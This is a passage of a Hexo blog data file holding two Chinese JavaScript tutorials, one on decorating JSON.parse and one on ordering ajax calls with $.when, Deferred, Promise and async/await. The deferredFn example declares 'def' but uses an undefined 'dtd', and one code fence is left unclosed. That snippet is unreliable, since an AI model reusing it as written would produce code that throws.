);\n};\n```\n\n这样一来短短几行代码就能解决99%的问题了，当然这个函数前提是被全局引用。但是还有一种情况我也无能为力了，必须全局查找修改。那就是使用`eval`函数格式化的代码，什么？你说重写Object的`toString`方法？算了，这操作太骚了，我不敢，毕竟项目里使用了大量的第三方插件。","slug":"Decorator","published":1,"updated":"2017-10-15T15:38:30.918Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl0005i4uc3fys1x78","content":"<p>前段时间一直在追<strong>装饰器模式</strong>，但是java的我都懂，为了扩展一个类或者其中的方法，非常的麻烦（相较于js），因为要新建一个类去装饰它，我更想知道js如何去实现的，看了网上的一些例子，发现并不是很实用，都是为了实现而实现，都没有从实际开发出发，有模仿java实现的嫌疑，模式模式，并不是固定的写法，它只是为了实现某种需求的一种思路，具体实现当然要从语言本身特性出发，废话不多说，还是从遇到的问题出发</p>\n<blockquote>\n<p>最近更新了Chrome，我发现项目里很多的接口返回的数据Preview一栏里居然乱码了，也没有format，第一反应就是浏览器更新了什么东西，因为代码不会无缘无故图片全部变成这样了，因为没有format，所以第一时间就能想到响应头本来就是错的！</p>\n</blockquote>\n<p>查看响应头后，数据类型果然全部都是text/html，拜托后端童鞋修改后果然显示正常也不乱码了（其实数据本身没有问题，就是显示乱码了），可是 很多页面出现了 JSON数据格式化错误的error信息，原因是我们之前很多的jQuery请求都没有设置相应数据类型，所以jq没有帮我们format，所以我们在<code>success</code>回调里主动<code>JSON.parse</code>了数据，现在改变了统一的相应类型，所以JSON.parse就报错了，有的页面没有报错是因为之前吃了同时的亏，有的接口json有的html格式，导致我直接</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">success( res ) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">let</span> data = <span class=\"keyword\">typeof</span> res === <span class=\"string\">'string'</span> ? <span class=\"built_in\">JSON</span>.parse( res ) : res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样就一劳永逸了，可是没有这么些的怎么办，几十上百个请求我都要去修改吗，那我还不如叫后端童鞋改回去呢，这不找事儿吗。</p>\n<p>解决问题，就要从问题发生的地方着手，问题出在JSON.parse（有的地方用的是<code>$.parseJSON</code>，查看源码后发现其实使用的还是JSON.parse，就不用管它了）身上，我们就从它入手好了，我们需要扩展一下JSON.parse的行为，<strong>装饰器模式</strong>就登场了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 备份原先的方法</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> _parseJson = <span class=\"built_in\">JSON</span>.parse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.parse = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> text, ...args </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> text === <span class=\"string\">'object'</span> ?</span><br><span class=\"line\">    text :</span><br><span class=\"line\">    _parseJson.call( <span class=\"keyword\">this</span>, text, ...args );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这样一来短短几行代码就能解决99%的问题了，当然这个函数前提是被全局引用。但是还有一种情况我也无能为力了，必须全局查找修改。那就是使用<code>eval</code>函数格式化的代码，什么？你说重写Object的<code>toString</code>方法？算了，这操作太骚了，我不敢，毕竟项目里使用了大量的第三方插件。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前段时间一直在追<strong>装饰器模式</strong>，但是java的我都懂，为了扩展一个类或者其中的方法，非常的麻烦（相较于js），因为要新建一个类去装饰它，我更想知道js如何去实现的，看了网上的一些例子，发现并不是很实用，都是为了实现而实现，都没有从实际开发出发，有模仿java实现的嫌疑，模式模式，并不是固定的写法，它只是为了实现某种需求的一种思路，具体实现当然要从语言本身特性出发，废话不多说，还是从遇到的问题出发</p>\n<blockquote>\n<p>最近更新了Chrome，我发现项目里很多的接口返回的数据Preview一栏里居然乱码了，也没有format，第一反应就是浏览器更新了什么东西，因为代码不会无缘无故图片全部变成这样了，因为没有format，所以第一时间就能想到响应头本来就是错的！</p>\n</blockquote>\n<p>查看响应头后，数据类型果然全部都是text/html，拜托后端童鞋修改后果然显示正常也不乱码了（其实数据本身没有问题，就是显示乱码了），可是 很多页面出现了 JSON数据格式化错误的error信息，原因是我们之前很多的jQuery请求都没有设置相应数据类型，所以jq没有帮我们format，所以我们在<code>success</code>回调里主动<code>JSON.parse</code>了数据，现在改变了统一的相应类型，所以JSON.parse就报错了，有的页面没有报错是因为之前吃了同时的亏，有的接口json有的html格式，导致我直接</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">success( res ) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">let</span> data = <span class=\"keyword\">typeof</span> res === <span class=\"string\">'string'</span> ? <span class=\"built_in\">JSON</span>.parse( res ) : res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样就一劳永逸了，可是没有这么些的怎么办，几十上百个请求我都要去修改吗，那我还不如叫后端童鞋改回去呢，这不找事儿吗。</p>\n<p>解决问题，就要从问题发生的地方着手，问题出在JSON.parse（有的地方用的是<code>$.parseJSON</code>，查看源码后发现其实使用的还是JSON.parse，就不用管它了）身上，我们就从它入手好了，我们需要扩展一下JSON.parse的行为，<strong>装饰器模式</strong>就登场了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 备份原先的方法</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> _parseJson = <span class=\"built_in\">JSON</span>.parse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.parse = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> text, ...args </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> text === <span class=\"string\">'object'</span> ?</span><br><span class=\"line\">    text :</span><br><span class=\"line\">    _parseJson.call( <span class=\"keyword\">this</span>, text, ...args );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这样一来短短几行代码就能解决99%的问题了，当然这个函数前提是被全局引用。但是还有一种情况我也无能为力了，必须全局查找修改。那就是使用<code>eval</code>函数格式化的代码，什么？你说重写Object的<code>toString</code>方法？算了，这操作太骚了，我不敢，毕竟项目里使用了大量的第三方插件。</p>\n"},{"title":"如何保证ajax按你想要的顺序执行？","catalog":true,"date":"2017-07-12T04:09:34.000Z","subtitle":"回调回调回调回调。。。。。flag、flag、flag、flag、flag...","header-img":"post/IMG_2544.JPG","_content":"\n前端的蓬勃发展和要求越来越高的用户体验，使得现在的web页面越来越依赖`ajax`，无处不在的ajax，无处不在的回调，使得你的代码越写越丑，还容易陷入`回调地狱`，比如这样：\n```javascript\n$.get('/test', function() {\n  \n  // do something\n\n  $.get('/test2', function() {\n  \n    // do something\n\n    $.get('/test3', function() {\n  \n      // do something\n\n      $.get('/test4', function() {\n  \n        // do something\n\n        $.get('/test5', function() {\n          \n        })\n      })\n    })\n  })\n\n});\n```\n今天我们的主题是谈谈多个ajax（当然不仅仅是ajax，包括所有的异步操作）的情况，如何能保证预期的执行顺序。\n\n> 案例：`ajax2` 返回的结果需要去匹配`ajax1`中返回的结果\n\najax1返回了如下数据：\n```javascript\n{\n  '10001': '成都',\n  '10002': '德阳',\n  ...\n}\n```\najax2返回了如下数据：\n```javascript\n{\n  cityCode: '10001'\n}\n```\n可能一般开发者会这样写：\n```javascript\nvar tempData = null;\n// 获取第一个接口的数据\n$.get( '/example1', function( data ) {\n  tempData = data\n} )\n// 获取第二个接口的数据\n$.get( '/example2', function( data ) {\n  // 匹配code\n  var cityName = tempData[ data.cityCode ];\n  console.log( cityName )\n} )\n```\n然后你发现好像对了，就这么完成了？多测试几次你就会发现，怎么有时候报错，有时候又正确呢？\n那是因为这两个请求都是独立的，互不影响，若接口2响应速度比接口1快，那铁定是要报错的，因为这个时候`tempData`还未被接口1赋值，仍然是初始化的`null`，如果你发现了问题，并且有点开发经验那你可能就会这样解决：\n```javascript\nvar tempData = null;\nvar tempData2 = null;\nvar cityName = null;\n// 获取第一个接口的数据\n$.get( '/example1', function( data ) {\n  tempData = data;\n  if ( cityName === null && tempData2 ) {\n    cityName = data[ tempData2.cityCode ];\n  }\n} )\n// 获取第二个接口的数据\n$.get( '/example2', function( data ) {\n  tempData2 = data;\n  // 匹配code\n  if ( tempData ) {\n    cityName = tempData[ data.cityCode ];\n  }\n} )\n```\n然后便解决了`燃眉之急`，好接下来，需求变了要求增加一个接口，接口2不仅要去匹配接口1，还要去匹配接口3，甚至更多接口，我们都要这样去写吗。好即使是您很有耐心，也很细心，但是作为程序员，有想过假如有人来维护你的代码，他的心情吗.....此处省略一万字\n\n于是`jQuery`的`$.when`隆重登场\n`$.when`方法接收不定个`deferred`类型的对象作为参数\n```javascript\n$.when( \n        $.ajax( '/example1' ),\n        $.ajax( '/example2' ), \n        $.ajax( '/example3' )\n      ).then( function( data ) {\n  // do something\n} );\n```\n从语法上你可以很清晰的看到注释的地方就是我们三个ajax返回后的回调函数，在这里你可以慢慢地做你基于这三个响应数据任何事，不必担心他们哪个因为响应时间过慢出现报错，你要问我怎么分别拿到三个回调的数据，那我只能说为什么不先尝试以下呢~\n\n好也许你不知道你此时到底要传递多少个ajax进去，3个、4个、5个都有可能，那你一定听说过'apply'方法：\n```javascript\nvar ajaxArray = [ $.ajax( '/example1' ) ];\n\n// 这里或许因为某个条件要添加一个ajax\nif ( condition ) {\n  ajaxArray.push( $.ajax( '/example2' ) );\n}\n// 这里或许又因为某个条件要添加一个ajax\nif ( condition2 ) {\n  ajaxArray.push( $.ajax( '/example3' ) );\n}\n...\n\n```javascript\n$.when.apply( $, ajaxArray ).then( function( data ) {\n  // do something\n} );\n```\n代码是不是干净整洁又大方？比起一堆flag让人容易理解多了，写代码就是拼良心，嗯~\n\n也许你比较高端，还用了插件，你需要往这个插件里写入`ajax`返回的数据，但是插件加载需要很久，也许是内部有setTimeout，也许是js代码太多，但是良心开发商会为你提供ready事件供你使用。但是如果你是个强迫症： “为什么我就不能和插件同时去加载，等他ready我直接写入数据不就行了。”（嗯也许那个强迫症患者就是我）。\n当你看到这里你肯定知道可以用`$.when`，去解决，但是等你写到一半，就会发现我特么怎么把插件和`when`方法对应起来，是的`when`方法的参数不是随随便便就能传的，它要的是`deferred`对象，别急jQuery肯定不会只给你造半个轮子供你使用的\n```javascript\n\n\n// 创建一个延迟对象\nvar deferred = $.Deferred();\n\nfunction deferredFn( def ) {\n  // 你的插件为你提供的ready回调\n  plugin.ready( function() {\n\n    // 这里表明你的异步操作已经完成了不需要在等待了\n    dtd.resolve( /* 如果有需要，这里可以传出你可能需要的数据，就像$.ajax里success方法给你的data一样 */ );    \n  } );\n\n  // 返回一个promise对象，外部无法改变这个函数的状态\n  return dtd.promise();\n}\n\n$.when( $.ajax( '/example' ), deferredFn( deferred/* 这里需要传入刚才创建的deferred对象 */ ) ).then( function( data ) {\n  // do something\n  // 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧\n} );\n\n//----------------------------\n\n// 以上便解决非ajax对象与ajax对象结合的问题，但我觉得应该有简洁的写法对吧\n\n$.when( $.ajax( '/example' ), ( function( dtd ) {\n  plugin.ready( function() {\n\n    dtd.resolve();\n  } );\n  return dtd.promise();\n}( $.Deferred() ) ) ).then( function( data ) {\n  // do something\n  // 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧\n} );\n```\n可能你还是对上面的`promise`,`deferred`等不是很了解，这里推荐阮一峰老师的[jQuery的deferred对象详解](http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html)\n***\n也许你比较傲娇不用`jQuery`，那办法还是有的，原生的`Promise`对象\n\n```javascript\nvar promise = new Promise( function( resolve, reject ) {\n  // ... some code\n\n  if ( /* 异步操作成功 */) {\n    resolve( value );\n  } else {\n    reject( error );\n  }\n} );\n\npromise.then( function( value ) {\n  // success\n}, function( error ) {\n  // failure\n} );\n```\n摆脱了框架的束缚，原生写起来也是很清爽的\n上面的插件ready例子就可以这样改写了\n```javascript\nvar promise = new Promise( function( resolve, reject ) {\n  // ... some code\n\n  plugin.ready( resolve );\n  // 没有error代码的话就不用管reject\n} );\npromise.then(function() {\n  // ... some code\n})\n```\n是否会觉的有点高大上呢\n忘了说`$.when`的替代，那就是`Promise.all`方法了\n```javascript\nvar p = Promise.all([p1, p2, p3]);\n```\n这里的参数类型和`$.when`稍有不同，这里传入的是一个数组对象，那我们就不必担心不定个异步参数的问题了，若想详细了解`Promise`可移步[Promise 对象](http://es6.ruanyifeng.com/#docs/promise)，嗯是的，还是阮大神的\n***\n看到这里的同学也是挺有耐心的，最上面的回调地狱我还没有忘，一层一层的嵌套真的很烦奥，就不能让代码堵在那？像`alert()`方法一样？答案当然是：能！\n于是我们的`async`函数和`await`关键字登场了（是的，又是ES6，写代码还不用ES6和咸鱼有啥区别）\n```javascript\nvar asyncRequest = async function () {\n  var f1 = await $.ajax( '/etc/fstab' );\n  var f2 = await $.ajax( '/etc/shells' );\n};\n```\nwtf!这么简单？是的，就是这么简单，这个函数内部，就是按照你想要的、预期的、你所看到的顺序在执行，从上到下。\n\n但是这里要注意的是`await`关键字后面必须跟一个`Promise`对象，ajax返回的也行，因为js引擎在执行时还是会根据该对象的`then`方法的状态来决定下一步如何继续，并且，如果这个对象状态变更为`reject`状态或是抛出了异常，那后面的代码是不再执行的，就和普通的代码执行逻辑一样。\n`async`函数还有许多用法和技巧，如果想详细了解依然可以移步阮一峰老师的[async 函数](http://es6.ruanyifeng.com/#docs/async)\n\n文章今天提到了`apply`函数，和其同路的还有`call`和`bind`，也许你又会说“好生僻”，可是，这都是经常用到的“神器”啊~，下一篇博文我将围绕这三个函数来讲讲他们的区别和实际使用\n\n","source":"_posts/ajax-promise.md","raw":"---\ntitle: 如何保证ajax按你想要的顺序执行？\ncatalog: true\ndate: 2017-07-12 12:09:34\nsubtitle: 回调回调回调回调。。。。。flag、flag、flag、flag、flag...\nheader-img: post/IMG_2544.JPG\ntags:\n- Promise\n- async await\n---\n\n前端的蓬勃发展和要求越来越高的用户体验，使得现在的web页面越来越依赖`ajax`，无处不在的ajax，无处不在的回调，使得你的代码越写越丑，还容易陷入`回调地狱`，比如这样：\n```javascript\n$.get('/test', function() {\n  \n  // do something\n\n  $.get('/test2', function() {\n  \n    // do something\n\n    $.get('/test3', function() {\n  \n      // do something\n\n      $.get('/test4', function() {\n  \n        // do something\n\n        $.get('/test5', function() {\n          \n        })\n      })\n    })\n  })\n\n});\n```\n今天我们的主题是谈谈多个ajax（当然不仅仅是ajax，包括所有的异步操作）的情况，如何能保证预期的执行顺序。\n\n> 案例：`ajax2` 返回的结果需要去匹配`ajax1`中返回的结果\n\najax1返回了如下数据：\n```javascript\n{\n  '10001': '成都',\n  '10002': '德阳',\n  ...\n}\n```\najax2返回了如下数据：\n```javascript\n{\n  cityCode: '10001'\n}\n```\n可能一般开发者会这样写：\n```javascript\nvar tempData = null;\n// 获取第一个接口的数据\n$.get( '/example1', function( data ) {\n  tempData = data\n} )\n// 获取第二个接口的数据\n$.get( '/example2', function( data ) {\n  // 匹配code\n  var cityName = tempData[ data.cityCode ];\n  console.log( cityName )\n} )\n```\n然后你发现好像对了，就这么完成了？多测试几次你就会发现，怎么有时候报错，有时候又正确呢？\n那是因为这两个请求都是独立的，互不影响，若接口2响应速度比接口1快，那铁定是要报错的，因为这个时候`tempData`还未被接口1赋值，仍然是初始化的`null`，如果你发现了问题，并且有点开发经验那你可能就会这样解决：\n```javascript\nvar tempData = null;\nvar tempData2 = null;\nvar cityName = null;\n// 获取第一个接口的数据\n$.get( '/example1', function( data ) {\n  tempData = data;\n  if ( cityName === null && tempData2 ) {\n    cityName = data[ tempData2.cityCode ];\n  }\n} )\n// 获取第二个接口的数据\n$.get( '/example2', function( data ) {\n  tempData2 = data;\n  // 匹配code\n  if ( tempData ) {\n    cityName = tempData[ data.cityCode ];\n  }\n} )\n```\n然后便解决了`燃眉之急`，好接下来，需求变了要求增加一个接口，接口2不仅要去匹配接口1，还要去匹配接口3，甚至更多接口，我们都要这样去写吗。好即使是您很有耐心，也很细心，但是作为程序员，有想过假如有人来维护你的代码，他的心情吗.....此处省略一万字\n\n于是`jQuery`的`$.when`隆重登场\n`$.when`方法接收不定个`deferred`类型的对象作为参数\n```javascript\n$.when( \n        $.ajax( '/example1' ),\n        $.ajax( '/example2' ), \n        $.ajax( '/example3' )\n      ).then( function( data ) {\n  // do something\n} );\n```\n从语法上你可以很清晰的看到注释的地方就是我们三个ajax返回后的回调函数，在这里你可以慢慢地做你基于这三个响应数据任何事，不必担心他们哪个因为响应时间过慢出现报错，你要问我怎么分别拿到三个回调的数据，那我只能说为什么不先尝试以下呢~\n\n好也许你不知道你此时到底要传递多少个ajax进去，3个、4个、5个都有可能，那你一定听说过'apply'方法：\n```javascript\nvar ajaxArray = [ $.ajax( '/example1' ) ];\n\n// 这里或许因为某个条件要添加一个ajax\nif ( condition ) {\n  ajaxArray.push( $.ajax( '/example2' ) );\n}\n// 这里或许又因为某个条件要添加一个ajax\nif ( condition2 ) {\n  ajaxArray.push( $.ajax( '/example3' ) );\n}\n...\n\n```javascript\n$.when.apply( $, ajaxArray ).then( function( data ) {\n  // do something\n} );\n```\n代码是不是干净整洁又大方？比起一堆flag让人容易理解多了，写代码就是拼良心，嗯~\n\n也许你比较高端，还用了插件，你需要往这个插件里写入`ajax`返回的数据，但是插件加载需要很久，也许是内部有setTimeout，也许是js代码太多，但是良心开发商会为你提供ready事件供你使用。但是如果你是个强迫症： “为什么我就不能和插件同时去加载，等他ready我直接写入数据不就行了。”（嗯也许那个强迫症患者就是我）。\n当你看到这里你肯定知道可以用`$.when`，去解决，但是等你写到一半，就会发现我特么怎么把插件和`when`方法对应起来，是的`when`方法的参数不是随随便便就能传的，它要的是`deferred`对象，别急jQuery肯定不会只给你造半个轮子供你使用的\n```javascript\n\n\n// 创建一个延迟对象\nvar deferred = $.Deferred();\n\nfunction deferredFn( def ) {\n  // 你的插件为你提供的ready回调\n  plugin.ready( function() {\n\n    // 这里表明你的异步操作已经完成了不需要在等待了\n    dtd.resolve( /* 如果有需要，这里可以传出你可能需要的数据，就像$.ajax里success方法给你的data一样 */ );    \n  } );\n\n  // 返回一个promise对象，外部无法改变这个函数的状态\n  return dtd.promise();\n}\n\n$.when( $.ajax( '/example' ), deferredFn( deferred/* 这里需要传入刚才创建的deferred对象 */ ) ).then( function( data ) {\n  // do something\n  // 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧\n} );\n\n//----------------------------\n\n// 以上便解决非ajax对象与ajax对象结合的问题，但我觉得应该有简洁的写法对吧\n\n$.when( $.ajax( '/example' ), ( function( dtd ) {\n  plugin.ready( function() {\n\n    dtd.resolve();\n  } );\n  return dtd.promise();\n}( $.Deferred() ) ) ).then( function( data ) {\n  // do something\n  // 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧\n} );\n```\n可能你还是对上面的`promise`,`deferred`等不是很了解，这里推荐阮一峰老师的[jQuery的deferred对象详解](http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html)\n***\n也许你比较傲娇不用`jQuery`，那办法还是有的，原生的`Promise`对象\n\n```javascript\nvar promise = new Promise( function( resolve, reject ) {\n  // ... some code\n\n  if ( /* 异步操作成功 */) {\n    resolve( value );\n  } else {\n    reject( error );\n  }\n} );\n\npromise.then( function( value ) {\n  // success\n}, function( error ) {\n  // failure\n} );\n```\n摆脱了框架的束缚，原生写起来也是很清爽的\n上面的插件ready例子就可以这样改写了\n```javascript\nvar promise = new Promise( function( resolve, reject ) {\n  // ... some code\n\n  plugin.ready( resolve );\n  // 没有error代码的话就不用管reject\n} );\npromise.then(function() {\n  // ... some code\n})\n```\n是否会觉的有点高大上呢\n忘了说`$.when`的替代，那就是`Promise.all`方法了\n```javascript\nvar p = Promise.all([p1, p2, p3]);\n```\n这里的参数类型和`$.when`稍有不同，这里传入的是一个数组对象，那我们就不必担心不定个异步参数的问题了，若想详细了解`Promise`可移步[Promise 对象](http://es6.ruanyifeng.com/#docs/promise)，嗯是的，还是阮大神的\n***\n看到这里的同学也是挺有耐心的，最上面的回调地狱我还没有忘，一层一层的嵌套真的很烦奥，就不能让代码堵在那？像`alert()`方法一样？答案当然是：能！\n于是我们的`async`函数和`await`关键字登场了（是的，又是ES6，写代码还不用ES6和咸鱼有啥区别）\n```javascript\nvar asyncRequest = async function () {\n  var f1 = await $.ajax( '/etc/fstab' );\n  var f2 = await $.ajax( '/etc/shells' );\n};\n```\nwtf!这么简单？是的，就是这么简单，这个函数内部，就是按照你想要的、预期的、你所看到的顺序在执行，从上到下。\n\n但是这里要注意的是`await`关键字后面必须跟一个`Promise`对象，ajax返回的也行，因为js引擎在执行时还是会根据该对象的`then`方法的状态来决定下一步如何继续，并且，如果这个对象状态变更为`reject`状态或是抛出了异常，那后面的代码是不再执行的，就和普通的代码执行逻辑一样。\n`async`函数还有许多用法和技巧，如果想详细了解依然可以移步阮一峰老师的[async 函数](http://es6.ruanyifeng.com/#docs/async)\n\n文章今天提到了`apply`函数，和其同路的还有`call`和`bind`，也许你又会说“好生僻”，可是，这都是经常用到的“神器”啊~，下一篇博文我将围绕这三个函数来讲讲他们的区别和实际使用\n\n","slug":"ajax-promise","published":1,"updated":"2017-07-12T15:17:37.439Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl0006i4uc86jyn9sw","content":"<p>前端的蓬勃发展和要求越来越高的用户体验，使得现在的web页面越来越依赖<code>ajax</code>，无处不在的ajax，无处不在的回调，使得你的代码越写越丑，还容易陷入<code>回调地狱</code>，比如这样：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.get(<span class=\"string\">'/test'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">  $.get(<span class=\"string\">'/test2'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">    $.get(<span class=\"string\">'/test3'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">      <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">      $.get(<span class=\"string\">'/test4'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $.get(<span class=\"string\">'/test5'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          </span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>今天我们的主题是谈谈多个ajax（当然不仅仅是ajax，包括所有的异步操作）的情况，如何能保证预期的执行顺序。</p>\n<blockquote>\n<p>案例：<code>ajax2</code> 返回的结果需要去匹配<code>ajax1</code>中返回的结果</p>\n</blockquote>\n<p>ajax1返回了如下数据：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">'10001'</span>: <span class=\"string\">'成都'</span>,</span><br><span class=\"line\">  <span class=\"string\">'10002'</span>: <span class=\"string\">'德阳'</span>,</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ajax2返回了如下数据：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  cityCode: <span class=\"string\">'10001'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可能一般开发者会这样写：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> tempData = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// 获取第一个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example1'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  tempData = data</span><br><span class=\"line\">&#125; )</span><br><span class=\"line\"><span class=\"comment\">// 获取第二个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example2'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 匹配code</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> cityName = tempData[ data.cityCode ];</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log( cityName )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>然后你发现好像对了，就这么完成了？多测试几次你就会发现，怎么有时候报错，有时候又正确呢？<br>\n那是因为这两个请求都是独立的，互不影响，若接口2响应速度比接口1快，那铁定是要报错的，因为这个时候<code>tempData</code>还未被接口1赋值，仍然是初始化的<code>null</code>，如果你发现了问题，并且有点开发经验那你可能就会这样解决：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> tempData = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> tempData2 = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cityName = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// 获取第一个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example1'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  tempData = data;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( cityName === <span class=\"literal\">null</span> &amp;&amp; tempData2 ) &#123;</span><br><span class=\"line\">    cityName = data[ tempData2.cityCode ];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; )</span><br><span class=\"line\"><span class=\"comment\">// 获取第二个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example2'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  tempData2 = 